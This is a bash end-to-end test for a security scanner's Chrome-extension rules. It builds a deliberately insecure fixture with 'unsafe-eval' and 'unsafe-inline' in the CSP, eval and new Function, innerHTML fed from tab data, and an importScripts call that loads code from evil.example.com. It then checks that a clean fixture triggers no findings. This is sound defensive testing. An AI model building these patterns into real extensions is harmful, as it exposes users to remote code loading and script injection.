#!/usr/bin/env bash
# test_chrome_rules.sh — e2e: proves the Chrome-extension security rules fire on
# a violating fixture and stay silent on a clean one.
#
# @proves CHROME-SEC-001 @proves CHROME-SEC-002 @proves CHROME-SEC-003
# @proves CHROME-SEC-004 @proves CHROME-SEC-005
source "$(dirname "$0")/helpers.sh"
set +o errexit
BINARY="$(resolve_binary "${1:-}")"
[[ -n "$BINARY" ]] || { echo "FAIL: keur binary not found"; exit 1; }

RULES="$(repo_root)/rules/security/chrome"

echo "==> test_chrome_rules ($BINARY)"

# --- violating fixture: must trigger all five rules --------------------------
BAD="$(mktemp -d)"
cat > "$BAD/manifest.json" <<'JSON'
{
  "manifest_version": 2,
  "name": "bad-ext",
  "permissions": ["tabs", "<all_urls>"],
  "content_security_policy": "script-src 'self' 'unsafe-eval' 'unsafe-inline'"
}
JSON
cat > "$BAD/background.js" <<'JS'
eval("danger");
const f = new Function("return 1");
element.innerHTML = tab.title;
importScripts("https://evil.example.com/x.js");
JS

OUT_BAD="$(KEUR_RULES_DIRS="$RULES" "$BINARY" scan "$BAD" 2>/dev/null)"
for id in CHROME-SEC-001 CHROME-SEC-002 CHROME-SEC-003 CHROME-SEC-004 CHROME-SEC-005; do
  if echo "$OUT_BAD" | grep -q "\"rule\":\"$id\""; then
    ok "$id fires on violating fixture"
  else
    fail "$id did NOT fire on violating fixture"
  fi
done

# --- clean fixture: none of the five may fire --------------------------------
GOOD="$(mktemp -d)"
cat > "$GOOD/manifest.json" <<'JSON'
{
  "manifest_version": 3,
  "name": "good-ext",
  "permissions": ["tabs", "storage"]
}
JSON
cat > "$GOOD/background.js" <<'JS'
element.textContent = tab.title;
chrome.tabs.query({}, (tabs) => { tabs.length; });
JS

OUT_GOOD="$(KEUR_RULES_DIRS="$RULES" "$BINARY" scan "$GOOD" 2>/dev/null)"
if echo "$OUT_GOOD" | grep -q '"rule":"CHROME-SEC-'; then
  fail "chrome rules false-positive on clean fixture" "$(echo "$OUT_GOOD" | grep 'CHROME-SEC-')"
else
  ok "no CHROME-SEC findings on clean fixture"
fi

rm -rf "$BAD" "$GOOD"
summary
